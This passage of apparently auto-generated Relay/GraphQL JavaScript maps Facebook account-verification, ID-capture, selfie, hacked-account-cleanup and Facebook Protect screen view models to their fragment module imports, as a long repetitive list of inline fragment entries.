                type: "XFBIXTAppealOutcomeScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometIXTAppealReviewStatusScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "XFBIXTAppealReviewStatusScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTAuthenticityWizardAppealReasonScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTAuthenticityWizardAppealReasonScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometIXTAuthenticityWizardCEPScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTAuthenticityWizardCEPScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTAuthenticityWizardContactPointConfirmationScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTAuthenticityWizardContactPointConfirmationScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTAuthenticityWizardContactPointScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTAuthenticityWizardContactPointScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTAuthenticityWizardEmailConfirmationScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTAuthenticityWizardEmailConfirmationScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometIXTAuthenticityWizardEmailScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTAuthenticityWizardEmailScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTAuthenticityWizardExceedQuotaErrorScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTAuthenticityWizardExceedQuotaErrorScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTAuthenticityWizardHomeLocationGeoApiScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTAuthenticityWizardHomeLocationGeoApiScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTAuthenticityWizardPersonalDetailsScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTAuthenticityWizardIdentityFlowPersonalDetailsScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTAuthenticityWizardIntroStepsScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTAuthenticityWizardIntroStepsScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTAuthenticityWizardKbaConfirmationScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTAuthenticityWizardKbaConfirmationScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTAuthenticityWizardKbaNoQuestionsScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTAuthenticityWizardKbaNoQuestionsScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTAuthenticityWizardKbaQuestionScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTAuthenticityWizardKbaQuestionScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTAuthenticityWizardLetterVerificationCodeScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTAuthenticityWizardLetterVerificationCodeScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTAuthenticityWizardLocationHandoffNotificationSentScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTAuthenticityWizardLocationHandoffNotificationSentScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTAuthenticityWizardLocationHandoffOnboardingScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTAuthenticityWizardLocationHandoffOnboardingScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTAuthenticityWizardMailingAddressConfirmationScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTAuthenticityWizardMailingAddressConfirmationScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTAuthenticityWizardMailingAddressDetailsScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTAuthenticityWizardMailingAddressDetailsScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTAuthenticityWizardManualNameInputScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTAuthenticityWizardManualNameInputScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTAuthenticityWizardMsiteHandoffScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTAuthenticityWizardMsiteHandoffScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTAuthenticityWizardMsiteHandoffSuccessfulUploadScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTAuthenticityWizardMsiteHandoffSuccessfulUploadScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTAuthenticityWizardNationalIdentifierScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTAuthenticityWizardNationalIdentifierScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTAuthenticityWizardNotaryDownloadConfirmationScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTAuthenticityWizardNotaryDownloadConfirmationScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTAuthenticityWizardNotaryDownloadLocaleSelectScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTAuthenticityWizardNotaryDownloadLocaleSelectScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTAuthenticityWizardNotaryDownloadOnboardingScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTAuthenticityWizardNotaryDownloadOnboardingScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTAuthenticityWizardNotaryUploadScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTAuthenticityWizardNotaryUploadScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometIXTAuthenticityWizardOutroScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTAuthenticityWizardOutroScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTAuthenticityWizardProductSpecificIntroScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTAuthenticityWizardProductSpecificIntroScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTAuthenticityWizardProfileCitySelectScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTAuthenticityWizardProfileCitySelectScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTAuthenticityWizardProfileCityUpdateScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTAuthenticityWizardProfileCityUpdateScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTAuthenticityWizardSelectIdOrNotaryScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTAuthenticityWizardSelectIdOrNotaryScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTCheckpointVulnerablePasswordChangeScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTCheckpointVulnerablePasswordChangeScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "IXTCustomMessagingMultipleItemsCometScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTCustomMessagingMultipleItemsScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTAuthenticityWizardDigitalIdAuthoriseScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "XFBIXTDigitalIdFlowAuthoriseScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTAuthenticityWizardDigitalIdDontmatchScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "XFBIXTDigitalIdFlowDontmatchScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTAuthenticityWizardDigitalIdOnboardingScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "XFBIXTDigitalIdFlowOnboardingScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTAuthenticityWizardDigitalIdOutroScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "XFBIXTDigitalIdFlowOutroScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometIXTDismissFlowScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTDismissFlowScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometIXTDismissFlowWithRedirectScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTDismissFlowWithRedirectScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometIXTEscalationScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTEscalationScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometIXTFacebookProtectBenefitsScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "XFBIXTFacebookProtectBenefitsScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTFacebookProtectFeaturePasswordCheckScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "XFBIXTFacebookProtectFeaturePasswordCheckScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTFacebookProtectFeatureTwoFactorCheckScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "XFBIXTFacebookProtectFeatureTwoFactorCheckScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometIXTFacebookProtectFinishLaterScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "XFBIXTFacebookProtectFinishLaterScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometIXTFacebookProtectHelpScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "XFBIXTFacebookProtectHelpScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometIXTFacebookProtectIntroScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTFacebookProtectIntroScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometIXTFacebookProtectLearnMoreScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "XFBIXTFacebookProtectLearnMoreScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTFacebookProtectModularProgressScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "XFBIXTFacebookProtectModularProgressScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometIXTFacebookProtectSuccessScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "XFBIXTFacebookProtectSuccessScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "IXTHackedCleanupEmailPendingConfirmCometScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTHackedCleanupEmailPendingConfirmScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "IXTHackedCleanupInfoCometScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTHackedCleanupInfoScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "IXTHackedCleanupInputCometScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTHackedCleanupInputScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "IXTHackedCleanupLinkedAccountsConfirmCometScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTHackedCleanupLinkedAccountsConfirmScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "IXTHackedCleanupLinkedAccountsSelectCometScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTHackedCleanupLinkedAccountsSelectScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "IXTHackedCleanupPasswordChangeCometScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTHackedCleanupPasswordChangeScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "IXTHackedCleanupStepCometScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTHackedCleanupStepScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometIXTHelloWorldAScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTHelloWorldAScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometIXTHelloWorldBScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTHelloWorldBScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometIXTHelloWorldCometAScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTHelloWorldCometAScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometIXTHelloWorldCometBScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTHelloWorldCometBScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometIXTHelloWorldCometScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTHelloWorldCometScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometIXTHelloWorldFirstScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTHelloWorldFirstScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTAuthenticityWizardCameraCaptureOnboardingScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTIdCaptureFlowCameraCaptureOnboardingScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTAuthenticityWizardCameraCaptureScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTIdCaptureFlowCameraCaptureScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTAuthenticityWizardDataStorageInfoScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTIdCaptureFlowDataStorageInfoScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTAuthenticityWizardDigitalIdMethodSelectScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTIdCaptureFlowDigitalIdMethodSelectScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTAuthenticityWizardDocumentTypeSelectScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTIdCaptureFlowDocumentTypeScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTAuthenticityWizardFilePickerScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTIdCaptureFlowFilePickerScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTAuthenticityWizardGroupTwoUploadScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTIdCaptureFlowGroupTwoUploadScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTAuthenticityWizardKarmaErrorScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTIdCaptureFlowKarmaErrorScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTAuthenticityWizardIdMobileHandoffScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTIdCaptureFlowMobileHandoffScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTAuthenticityWizardPhotoRequirementsScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTIdCaptureFlowPhotoRequirementsScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTAuthenticityWizardSubmissionFeedbackScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTIdCaptureFlowSubmissionFeedbackScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTAuthenticityWizardIdUploadMethodSelectScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTIdCaptureFlowUploadMethodScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometIXTSecuredActionPasswordScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTSecuredActionPasswordScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTAuthenticityWizardSelfieCaptureScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTSelfieCaptureFlowCaptureScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTAuthenticityWizardSelfieCaptureOnboardingScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTSelfieCaptureFlowOnboardingScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTAuthenticityWizardSocialVouchingRequestorIntroScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "XFBIXTSocialVouchingRequestorIntroScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTAuthenticityWizardSocialVouchingRequestorOutroScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "XFBIXTSocialVouchingRequestorOutroScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTAuthenticityWizardSocialVouchingRequestorSelectFriendsScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "XFBIXTSocialVouchingRequestorSelectFriendsScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTAuthenticityWizardSocialVouchingVoucherApproveConfirmScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "XFBIXTSocialVouchingVoucherApproveConfirmScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTAuthenticityWizardSocialVouchingVoucherApproveDeclineSelectorScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "XFBIXTSocialVouchingVoucherApproveDeclineSelectorScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
